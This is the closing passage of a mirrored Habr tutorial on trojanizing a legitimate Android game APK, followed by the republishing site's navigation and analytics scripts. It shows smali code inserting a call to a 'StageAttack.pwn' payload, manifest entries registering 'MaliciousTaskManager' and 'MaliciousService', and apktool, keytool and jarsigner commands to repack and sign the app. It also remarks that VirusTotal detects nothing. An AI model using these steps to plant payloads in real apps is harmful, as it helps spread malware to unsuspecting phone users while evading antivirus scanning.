class="hljs-number">472</span></span> invoke-<span class="hljs-keyword"><span class="hljs-keyword">static</span></span> {p0}, Lcom/halfbrick/mortar/StageAttack;-&gt;pwn(Landroid/content/Context;)V .line <span class="hljs-number"><span class="hljs-number">473</span></span> invoke-<span class="hljs-keyword"><span class="hljs-keyword">static</span></span> {}, Lcom/halfbrick/mortar/NativeGameLib;-&gt;TryLoadGameLibrary()Z .line <span class="hljs-number"><span class="hljs-number">475</span></span> invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;-&gt;getIntent()Landroid/content/Intent; ...</code> </pre> <br><p>  The <code>MaliciousTaskManager</code> class in payload is BroadcastReceiver, and <code>MaliciousService</code> is IntentService, so we need to write them in the manifest. </p><br><pre> <code class="xml hljs">... <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".MaliciousTaskManager"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".MaliciousService"</span></span></span><span class="hljs-tag">/&gt;</span></span> ...</code> </pre> <br><p>  We pack everything back with the <code>apktool b myfolder</code> .  As a result, we get the apk file.  Now we need to sign it so that the android accepts our application.  First, we will generate a key with which we will sign: </p><br><pre> <code class="plaintext hljs">keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code> </pre> <br><p>  We sign apk: </p><br><pre> <code class="plaintext hljs">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name</code> </pre> <br><p>  Virustotal will not show us anything, since we are not doing anything ‚Äúillegal‚Äù.  We just use the available permissions of our application. </p><br><p><img src="https://habrastorage.org/webt/po/ht/iu/pohtiuf5xpkonifhpozoth_pgbu.png" alt="image"></p><br><p>  Video demonstrating the final work: </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/e5w5taMY8MA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/iBCX_A5FBVU" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  <a href="https://t.me/OrderOfSixAngles">Telegram channel</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/460993/">https://habr.com/ru/post/460993/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../460985/index.html">14 Best Kanban Tools in 2019</a></li>
<li><a href="../460987/index.html">"God Mode for the Internet": tracking users through extensions Chrome and Firefox</a></li>
<li><a href="../460989/index.html">Which language - D, Go or Rust has better prospects to replace C and why?</a></li>
<li><a href="../46099/index.html">Real estate without intermediaries</a></li>
<li><a href="../460991/index.html">Tic Tac Toe, Part 5: Backend in C ++ Boost.Beast, HTTP</a></li>
<li><a href="../460995/index.html">We deploy the ML project using Flask as a REST API and make it accessible through the Flutter application</a></li>
<li><a href="../460997/index.html">Tourists help scientists estimate the number of large predators</a></li>
<li><a href="../460999/index.html">Let's play a little game with Lamoda</a></li>
<li><a href="../461/index.html">IT for small businesses - a separate market segment</a></li>
<li><a href="../4610/index.html">Technologies and Usability Market in Russia</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>